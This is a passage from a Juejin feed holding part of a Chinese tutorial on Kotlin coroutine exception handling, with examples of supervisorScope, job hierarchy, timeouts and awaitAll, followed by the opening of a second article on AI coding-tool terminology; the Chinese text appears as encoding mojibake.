    println(<span class="hljs-string">"Main: Job cancelled."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Job: Working...
Main: Cancelling the job.
Job: Entering finally block.
Job: Starting a suspending cleanup that takes 500ms...
Job: Crucial cleanup finished.
Main: Job cancelled.
</code></pre>
<p>å³ä½¿åç¨‹è¢«å–æ¶ˆï¼Œ<code>NonCancellable</code> å—å†…çš„ <code>delay(500)</code> ä»èƒ½é¡ºåˆ©æ‰§è¡Œï¼Œç¡®ä¿æ¸…ç†é€»è¾‘å®Œæˆã€‚</p>
<p>å¦‚æœä½ éœ€è¦åœ¨åç¨‹è¢«å–æ¶ˆä¹‹åæ‰§è¡Œä¸€ä¸ªæ¸…ç†ä»»åŠ¡ï¼Œä½†æ˜¯è¿™ä¸ªæ¸…ç†ä»»åŠ¡åˆæ˜¯ä¸€ä¸ªå¯æŒ‚èµ·çš„å‡½æ•°ï¼Œé‚£ä¹ˆ <code>NonCancellable</code> å°±å†é€‚åˆä¸è¿‡äº†ã€‚</p>
<h2 data-id="heading-24">åœºæ™¯ä¹ï¼šåµŒå¥—ä½œç”¨åŸŸä¸å¼‚å¸¸ä¼ æ’­ç»†èŠ‚</h2>
<p><code>coroutineScope</code>ï¼ˆå¤±è´¥å³å–æ¶ˆï¼‰å’Œ <code>supervisorScope</code>ï¼ˆéš”ç¦»å¤±è´¥ï¼‰çš„è§„åˆ™ï¼Œä»…å¯¹<strong>ç›´æ¥å­åç¨‹</strong>ç”Ÿæ•ˆã€‚</p>
<p>åµŒå¥—ç»“æ„ä¸­ï¼Œå†…å±‚ä½œç”¨åŸŸçš„è§„åˆ™ä¸ä¼šè¢«å¤–å±‚è¦†ç›–â€”â€”æ¯”å¦‚ <code>supervisorScope</code> å†…çš„ <code>coroutineScope</code>ï¼Œä»éµå¾ªâ€œå†…éƒ¨å¤±è´¥å³å…¨å–æ¶ˆâ€ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// é¡¶å±‚ supervisorScopeï¼šéš”ç¦»ç›´æ¥å­åç¨‹å¤±è´¥</span>
    supervisorScope {
        <span class="hljs-comment">// ç›´æ¥å­åç¨‹ 1ï¼šæ­£å¸¸è¿è¡Œ</span>
        launch {
            println(<span class="hljs-string">"Supervisor's Child 1: I survived!"</span>)
        }

        <span class="hljs-comment">// ç›´æ¥å­åç¨‹ 2ï¼šåŒ…å«å†…å±‚ coroutineScope</span>
        launch {
            coroutineScope { <span class="hljs-comment">// å†…å±‚éµå¾ªâ€œå¤±è´¥å³å–æ¶ˆâ€</span>
                println(<span class="hljs-string">"Inner Scope Child: I'm about to fail!"</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Failure in inner scope"</span>)
            }
        }
    }
    println(<span class="hljs-string">"All done."</span>)
}
</code></pre>
<h5 data-id="heading-25">è¾“å‡ºç»“æœ</h5>
<pre><code class="hljs language-Plain" lang="Plain">
Inner Scope Child: I'm about to fail!
Supervisor's Child 1: I survived!
Exception in thread "main" java.lang.RuntimeException: Failure in inner scope
...
</code></pre>
<p>å…³é”®ç»“è®ºï¼šSupervisor's Child 1 æœªå—å½±å“ï¼ˆä½“ç° <code>supervisorScope</code> éš”ç¦»ç‰¹æ€§ï¼‰ï¼›å†…å±‚ <code>coroutineScope</code> çš„å­åç¨‹å¤±è´¥åï¼Œå†…å±‚ä½œç”¨åŸŸè‡ªèº«è¢«å–æ¶ˆï¼ˆä½“ç° <code>coroutineScope</code> è§„åˆ™ï¼‰ï¼›æœªæ•è·çš„å¼‚å¸¸æœ€ç»ˆå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p>
<h2 data-id="heading-26">åœºæ™¯åï¼šä»»åŠ¡å±‚çº§è¯¦è§£</h2>
<p>ç»“æ„åŒ–å¹¶å‘çš„æ ¸å¿ƒæ˜¯â€œä»»åŠ¡å±‚çº§ï¼ˆJob Hierarchyï¼‰â€ï¼Œå¯ä»¥å½¢è±¡ç†è§£ä¸ºä¸€æ£µä»»åŠ¡æ ‘ï¼š</p>
<ul>
<li>
<p>åœ¨åç¨‹ï¼ˆæˆ–ä½œç”¨åŸŸï¼‰ä¸­å¯åŠ¨æ–°åç¨‹æ—¶ï¼Œæ–°åç¨‹ä¼šæˆä¸ºçˆ¶åç¨‹çš„å­ä»»åŠ¡ï¼›</p>
</li>
<li>
<p>çˆ¶ä»»åŠ¡æœ‰ä¸¤ä¸ªæ ¸å¿ƒè´£ä»»ï¼šä¸€æ˜¯ç­‰å¾…æ‰€æœ‰å­ä»»åŠ¡å®Œæˆåæ‰ä¼šè‡ªèº«å®Œæˆï¼›äºŒæ˜¯è‹¥å­ä»»åŠ¡å¤±è´¥ï¼ˆé <code>supervisor</code> åœºæ™¯ï¼‰ï¼Œåˆ™å–æ¶ˆæ‰€æœ‰å…¶ä»–å­ä»»åŠ¡å¹¶è‡ªèº«å¤±è´¥ã€‚</p>
</li>
</ul>
<p>è¿™ç§å±‚çº§å…³ç³»ç¡®ä¿äº†åç¨‹çš„â€œç»“æ„åŒ–â€ï¼Œé¿å…ä»»åŠ¡å¤±æ§ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// runBlocking æ˜¯é¡¶å±‚çˆ¶ä½œç”¨åŸŸ</span>
    println(<span class="hljs-string">"Parent Scope: I'm the parent job."</span>)
    <span class="hljs-keyword">val</span> job1 = launch {
        println(<span class="hljs-string">"Child Job 1: I'm a child of the parent scope."</span>)
        delay(<span class="hljs-number">1000</span>)
        println(<span class="hljs-string">"Child 1: I'm done."</span>)
    }

    <span class="hljs-keyword">val</span> job2 = launch {
        println(<span class="hljs-string">"Child Job 2: I'm also a child."</span>)
        delay(<span class="hljs-number">500</span>)
        <span class="hljs-comment">// åˆ›å»ºå­™åç¨‹ï¼ˆjob2 çš„å­åç¨‹ï¼‰</span>
        launch {
            println(<span class="hljs-string">"Grandchild: My parent is Child 2."</span>)
            delay(<span class="hljs-number">500</span>)
            println(<span class="hljs-string">"Grandchild: I'm done."</span>)
        }
        println(<span class="hljs-string">"Child 2: I'm done."</span>)
    }

    println(<span class="hljs-string">"Parent Scope: Waiting for my children to finish."</span>)
    <span class="hljs-comment">// runBlocking ä¼šç­‰å¾…æ‰€æœ‰å­ä»»åŠ¡ï¼ˆjob1ã€job2ã€å­™åç¨‹ï¼‰å®Œæˆåæ‰ç»“æŸ</span>
}
</code></pre>
<h5 data-id="heading-27">è¾“å‡ºç»“æœ</h5>
<pre><code class="hljs language-Plain" lang="Plain">
Parent Scope: I'm the parent job.
Parent Scope: Waiting for my children to finish.
Child Job 1: I'm a child of the parent scope.
Child Job 2: I'm also a child.
Grandchild: My parent is Child 2.
Grandchild: I'm done.
Child 2: I'm done.
Child 1: I'm done.
</code></pre>
<p>å¯è§ï¼Œ<code>runBlocking</code> ä½œä¸ºçˆ¶ä½œç”¨åŸŸï¼Œä¼šç­‰å¾…æ‰€æœ‰å­åç¨‹ï¼ˆåŒ…æ‹¬åµŒå¥—çš„å­™åç¨‹ï¼‰å®Œæˆåæ‰ç»“æŸï¼Œå®Œå…¨éµå¾ªä»»åŠ¡å±‚çº§çš„çº¦æŸã€‚</p>
<h2 data-id="heading-28">åœºæ™¯åä¸€ï¼šsupervisorScope vs CoroutineScope(SupervisorJob())</h2>
<p>ä¸¤è€…éƒ½åŸºäº <code>SupervisorJob</code> å®ç°å¤±è´¥éš”ç¦»ï¼Œä½†é€‚ç”¨åœºæ™¯ä¸åŒï¼š</p>
<ul>
<li>
<p><strong>supervisorScope { ... }</strong>ï¼šç”¨äºåˆ›å»ºâ€œå±€éƒ¨éš”ç¦»åŒºâ€ï¼Œé€‚åˆéš”ç¦»ä¸€ç»„ç›¸å…³ä½†ç‹¬ç«‹çš„ä¸´æ—¶ä»»åŠ¡ã€‚å®ƒæ˜¯ä¸€ä¸ªæŒ‚èµ·å‡½æ•°ï¼ˆ<strong>è¿™æ„å‘³ç€å®ƒçš„è¿è¡Œéœ€è¦ä¸€ä¸ªåç¨‹åŸŸ</strong>ï¼‰ï¼Œä¼šç­‰å¾…æ‰€æœ‰ç›´æ¥å­åç¨‹å®Œæˆï¼›è‹¥å­åç¨‹å¼‚å¸¸æœªè¢«æ•è·ï¼Œä¼šæŠ›å‡ºåˆ°å¤–éƒ¨ä½œç”¨åŸŸã€‚</p>
</li>
<li>
<p><strong>CoroutineScope(SupervisorJob())</strong>ï¼šåˆ›å»ºä¸€ä¸ªå¯å¤ç”¨çš„ä½œç”¨åŸŸå¯¹è±¡ï¼ˆ<code>å®ƒæœ¬èº«å°±æ˜¯åœ¨åˆ›å»ºä¸€ä¸ªåç¨‹åŸŸ</code>ï¼‰ï¼Œé€‚åˆç»„ä»¶åŒ–æ¶æ„ï¼ˆå¦‚ Android <code>ViewModel</code>ã€ç‹¬ç«‹æ¨¡å—ï¼‰ã€‚ä½œç”¨åŸŸå†…çš„ç›´æ¥å­åç¨‹ç›¸äº’éš”ç¦»ï¼Œä¸”ä½œç”¨åŸŸä¸ä¼šè‡ªåŠ¨ç»“æŸï¼Œéœ€æ˜¾å¼è°ƒç”¨ <code>cancel()</code> é”€æ¯ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Component</span> {
    <span class="hljs-comment">// åˆ›å»ºå¸¦ SupervisorJob å’Œå¼‚å¸¸å¤„ç†å™¨çš„ä½œç”¨åŸŸ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(SupervisorJob() + CoroutineExceptionHandler { _, e -&gt;
        println(<span class="hljs-string">"Component: Caught an error: <span class="hljs-variable">$e</span>"</span>)
    })

    <span class="hljs-comment">// å¯åŠ¨é«˜é£é™©ä»»åŠ¡</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startRiskyTask</span><span class="hljs-params">()</span></span> {
        scope.launch {
            println(<span class="hljs-string">"Risky Task: Starting..."</span>)
            delay(<span class="hljs-number">1000</span>)
            <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Something went wrong"</span>)
        }
    }

    <span class="hljs-comment">// å¯åŠ¨ç¨³å®šä»»åŠ¡</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startStableTask</span><span class="hljs-params">()</span></span> {
        scope.launch {
            println(<span class="hljs-string">"Stable Task: I'm running..."</span>)
            delay(<span class="hljs-number">1000</span>)
            println(<span class="hljs-string">"Stable Task: I finished successfully."</span>)
        }
    }

    <span class="hljs-comment">// ç»„ä»¶é”€æ¯æ—¶å–æ¶ˆä½œç”¨åŸŸ</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"Component: Destroying and cancelling scope."</span>)
        scope.cancel()
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> component = Component()
    component.startRiskyTask()
    component.startStableTask()
    delay(<span class="hljs-number">2000</span>) <span class="hljs-comment">// ç­‰å¾…ä»»åŠ¡æ‰§è¡Œ</span>
    component.destroy()
    delay(<span class="hljs-number">500</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Risky Task: Starting...
Stable Task: I'm running...
Component: Caught an error: java.lang.RuntimeException: Something went wrong
Stable Task: I finished successfully.
Component: Destroying and cancelling scope.
</code></pre>
<p>å³ä½¿é«˜é£é™©ä»»åŠ¡å¤±è´¥ï¼Œç¨³å®šä»»åŠ¡ä»æ­£å¸¸å®Œæˆï¼›ä½œç”¨åŸŸä¿æŒæ´»è·ƒç›´åˆ°æ˜¾å¼é”€æ¯ï¼Œç¬¦åˆç»„ä»¶åŒ–å¼€å‘çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†éœ€æ±‚ã€‚</p>
<h3 data-id="heading-29">åœºæ™¯åäºŒï¼šå¤„ç†è¶…æ—¶</h3>
<p>é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡å¯èƒ½å¯¼è‡´èµ„æºå ç”¨æˆ–å“åº”ç¼“æ…¢ï¼Œåç¨‹æä¾›äº†ç®€æ´çš„è¶…æ—¶æ§åˆ¶æ–¹æ¡ˆï¼š</p>
<ul>
<li>
<p><strong>withTimeout(timeoutMillis) { ... }</strong>ï¼šæ‰§è¡Œä»£ç å—ï¼Œè‹¥è¶…æ—¶åˆ™æŠ›å‡º <code>TimeoutCancellationException</code>ï¼ŒåŒæ—¶å–æ¶ˆåç¨‹ï¼›</p>
</li>
<li>
<p><strong>withTimeoutOrNull(timeoutMillis) { ... }</strong>ï¼šéæŠ›å‡ºç‰ˆæœ¬ï¼Œè¶…æ—¶åè¿”å› <code>null</code>ï¼Œä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä»£ç æ›´ç®€æ´æ˜“ç»´æŠ¤ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// ä½¿ç”¨ withTimeoutï¼ˆæŠ›å‡ºç‰ˆï¼‰</span>
    <span class="hljs-keyword">try</span> {
        withTimeout(<span class="hljs-number">1000</span>) {
            println(<span class="hljs-string">"Task 1: I have a second to complete."</span>)
            delay(<span class="hljs-number">2000</span>) <span class="hljs-comment">// ä¼šè¶…æ—¶</span>
            println(<span class="hljs-string">"Task 1: I finished."</span>) <span class="hljs-comment">// ä¸ä¼šæ‰§è¡Œ</span>
        }
    } <span class="hljs-keyword">catch</span> (e: TimeoutCancellationException) {
        println(<span class="hljs-string">"Task 1 failed: <span class="hljs-subst">${e.message}</span>"</span>)
    }

    <span class="hljs-comment">// ä½¿ç”¨ withTimeoutOrNullï¼ˆéæŠ›å‡ºç‰ˆï¼‰</span>
    <span class="hljs-keyword">val</span> result = withTimeoutOrNull(<span class="hljs-number">1000</span>) {
        println(<span class="hljs-string">"Task 2: Trying to complete in 1 second."</span>)
        delay(<span class="hljs-number">2000</span>)
        <span class="hljs-string">"Success"</span>
    }

    <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>) {
        println(<span class="hljs-string">"Task 2 timed out and returned null."</span>)
    } <span class="hljs-keyword">else</span> {
        println(<span class="hljs-string">"Task 2 finished with result: <span class="hljs-variable">$result</span>"</span>)
    }
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Task 1: I have a second to complete.
Task 1 failed: Timed out waiting for 1000 ms
Task 2: Trying to complete in 1 second.
Task 2 timed out and returned null.
</code></pre>
<p>å®é™…å¼€å‘ä¸­ï¼ŒwithTimeoutOrNull æ›´å¸¸ç”¨ï¼Œå¯é¿å…é¢å¤–çš„ try-catch åµŒå¥—ã€‚</p>
<h2 data-id="heading-30">åœºæ™¯åä¸‰ï¼šç­‰å¾…å¤šä¸ªå¼‚æ­¥ä»»åŠ¡çš„å¼‚å¸¸å¤„ç†</h2>
<p>å½“éœ€è¦ç­‰å¾…å¤šä¸ª <code>async</code> ä»»åŠ¡å®Œæˆæ—¶ï¼Œæ¨èä½¿ç”¨ <code>awaitAll()</code>â€”â€”å®ƒéµå¾ªâ€œå…¨æˆ–æ— â€åŸåˆ™ï¼Œä¸ <code>coroutineScope</code> é€»è¾‘ä¸€è‡´ï¼šè‹¥ä»»æ„ä¸€ä¸ªä»»åŠ¡å¤±è´¥ï¼Œç«‹å³å–æ¶ˆæ‰€æœ‰å…¶ä»–ä»»åŠ¡ï¼Œå¹¶æŠ›å‡ºç¬¬ä¸€ä¸ªå¤±è´¥çš„å¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting multiple async jobs."</span>)
    <span class="hljs-keyword">try</span> {
        coroutineScope {
            <span class="hljs-keyword">val</span> deferred1 = async {
                delay(<span class="hljs-number">1000</span>)
                println(<span class="hljs-string">"Job 1: Success."</span>)
                <span class="hljs-string">"Result 1"</span>
            }

            <span class="hljs-keyword">val</span> deferred2 = async {
                delay(<span class="hljs-number">500</span>)
                println(<span class="hljs-string">"Job 2: Failing!"</span>)
                <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Job 2 Error"</span>)
            }

            <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆï¼Œä»»æ„å¤±è´¥åˆ™ç«‹å³æŠ›å‡ºå¼‚å¸¸</span>
            <span class="hljs-keyword">val</span> results = awaitAll(deferred1, deferred2)
            println(<span class="hljs-string">"All jobs finished: <span class="hljs-variable">$results</span>"</span>) <span class="hljs-comment">// ä¸ä¼šæ‰§è¡Œ</span>
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        println(<span class="hljs-string">"Caught exception in awaitAll: <span class="hljs-subst">${e.message}</span>"</span>)
    }
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting multiple async jobs.
Job 2: Failing!
Caught exception in awaitAll: Job 2 Error
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒJob 2 å¤±è´¥åï¼Œ<code>awaitAll()</code> ç«‹å³æŠ›å‡ºå¼‚å¸¸ï¼ŒJob 1 è¢«å–æ¶ˆï¼ˆå…¶å»¶è¿Ÿ 1000ms çš„ä»»åŠ¡æœªå®Œæˆï¼Œå› æ­¤â€œJob 1: Success.â€ æœªæ‰“å°ï¼‰ã€‚</p>
<h2 data-id="heading-31">æ€»ç»“</h2>
<p>ä»¥ä¸Šåœºæ™¯è¦†ç›–äº†åç¨‹å¼‚å¸¸å¤„ç†çš„æ ¸å¿ƒåœºæ™¯å’Œæœ€ä½³å®è·µã€‚</p>
<p><em>å±å¹•å‰çš„ä½ ï¼Œç°åœ¨å¼ºçš„å¯æ€•ï¼</em></p>
<p>å¼‚å¸¸å¤„ç†çš„æ ¸å¿ƒåŸåˆ™æ˜¯ï¼šåˆ©ç”¨ç»“æ„åŒ–å¹¶å‘çš„å±‚çº§ç‰¹æ€§ï¼Œè®©å¼‚å¸¸å¤„ç†é€»è¾‘ç´§è·Ÿå¼‚å¸¸å‘ç”Ÿä½ç½®ï¼Œæ ¹æ®ä»»åŠ¡å…³è”æ€§é€‰æ‹©åˆé€‚çš„ä½œç”¨åŸŸï¼ˆ<code>coroutineScope</code>/<code>supervisorScope</code>ï¼‰ï¼Œå¿…è¦æ—¶ç”¨ <code>CoroutineExceptionHandler</code> å…œåº•ã€‚</p>
<p><em>å®åœ¨ä¸è¡Œï¼Œå¤æ³•æ•è·ï¼</em></p>
<p>æŒæ¡è¿™äº›é€»è¾‘ï¼Œå°±èƒ½è®©åç¨‹çš„å¼‚å¸¸å¤„ç†æ—¢å®‰å…¨åˆä¼˜é›…ã€‚</p>
<p><em>æˆ‘æŠŠè¿™ç¯‡æ–‡ç« ç”©ç»™æˆ‘çš„åŒäº‹ï¼Œæˆ‘ç›¸ä¿¡ä»–ä»¥åç»å¯¹ä¸ä¼šé—®æˆ‘å¼‚å¸¸å¤„ç†çš„é—®é¢˜äº†ã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Skillsç«äº†ï¼Œä¸€ç¯‡å¸¦ä½ çœ‹æ‡‚æ¥é¾™å»è„‰]]></title>    <link>https://juejin.cn/post/7597348590710128680</link>    <guid>https://juejin.cn/post/7597348590710128680</guid>    <pubDate>2026-01-21T04:50:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597348590710128680" data-draft-id="7597375708767682560" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Skillsç«äº†ï¼Œä¸€ç¯‡å¸¦ä½ çœ‹æ‡‚æ¥é¾™å»è„‰"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,Cursor,Claude"/> <meta itemprop="datePublished" content="2026-01-21T04:50:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«¥æ¬§å·´"/> <meta itemprop="url" content="https://juejin.cn/user/3491704662669469"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Skillsç«äº†ï¼Œä¸€ç¯‡å¸¦ä½ çœ‹æ‡‚æ¥é¾™å»è„‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3491704662669469/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«¥æ¬§å·´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T04:50:55.000Z" title="Wed Jan 21 2026 04:50:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p>Skillsï¼ŒRulesï¼ŒCommandsï¼ŒMCP Serversï¼ŒSubagentsï¼ŒModesï¼ŒHookï¼ŒToolsã€‚</p>
<p>çœ‹ç€è¿™ä¸€é•¿ä¸²è‹±æ–‡æœ¯è¯­ï¼Œä½ æ˜¯ä¸æ˜¯æ„Ÿè§‰è„‘ç“œå­å—¡å—¡çš„ï¼Ÿ</p>
